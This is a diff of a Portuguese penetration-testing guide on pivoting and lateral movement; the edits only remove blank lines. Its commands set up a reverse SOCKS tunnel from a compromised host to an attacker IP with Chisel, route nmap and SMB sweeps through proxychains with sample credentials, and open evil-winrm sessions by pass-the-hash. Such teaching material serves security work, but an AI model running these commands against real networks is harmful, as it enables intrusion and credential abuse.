@@ -26,15 +26,12 @@ Com privilégios elevados estabelecidos em um ponto de apoio (*foothold*), esta 
 
 ```bash
 # Inicialização do servidor Chisel na máquina atacante (com suporte a criação de proxy SOCKS5 pelo cliente)
-
 chisel server -p [porta_de_escuta] --reverse
 
 # Conexão do cliente (executado no host pivô comprometido) estabelecendo um proxy SOCKS5 reverso
-
 chisel client [IP_atacante]:[porta_de_escuta] R:socks
 
 # Tunelamento direto (forward) de uma porta interna específica de um segundo host para a máquina atacante
-
 chisel client [IP_atacante]:[porta_de_escuta] [porta_local]:[IP_interno]:[porta_remota]
 ```
 
@@ -44,7 +41,6 @@ chisel client [IP_atacante]:[porta_de_escuta] [porta_local]:[IP_interno]:[porta_
 
 ```bash
 chisel server -p 8000 --reverse
-
 chisel client 203.0.113.50:8000 R:socks
 ```
 
@@ -63,17 +59,13 @@ chisel client 203.0.113.50:8000 R:socks
 
 ```bash
 # Edição do arquivo de configuração para adicionar o proxy SOCKS5 estabelecido (ex: via túnel Chisel/SSH)
-
 nano /etc/proxychains4.conf
 
 # Adicionar ao final do arquivo: socks5 127.0.0.1 1080
-
 # Execução de qualquer comando/ferramenta roteando seu tráfego através da cadeia de proxies configurada
-
 proxychains [comando_e_argumentos_da_ferramenta]
 
 # Exemplo de varredura de portas roteada através do proxy, contra a rede interna alcançada via pivot
-
 proxychains nmap -sT -Pn [bloco_IP_interno_ou_CIDR]
 ```
 
@@ -101,19 +93,15 @@ proxychains nxc smb 192.168.20.0/24 -u joao.silva -p 'Senha@2024'
 
 ```bash
 # Conexão autenticada via senha em texto claro
-
 evil-winrm -i [IP_do_alvo] -u [usuario] -p [senha]
 
 # Conexão autenticada via hash NTLM (Pass-the-Hash), sem necessidade da senha em texto claro
-
 evil-winrm -i [IP_do_alvo] -u [usuario] -H [hash_ntlm]
 
 # Conexão especificando um diretório local para facilitar o upload/download de scripts e ferramentas
-
 evil-winrm -i [IP_do_alvo] -u [usuario] -p [senha] -s [diretorio_local_de_scripts]
 
 # Dentro da sessão: carregamento de um script PowerShell diretamente em memória
-
 menu
 ```
 
@@ -123,7 +111,6 @@ menu
 
 ```bash
 evil-winrm -i 10.0.5.40 -u administrador -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -s /opt/scripts_powershell
-
 menu
 ```
 
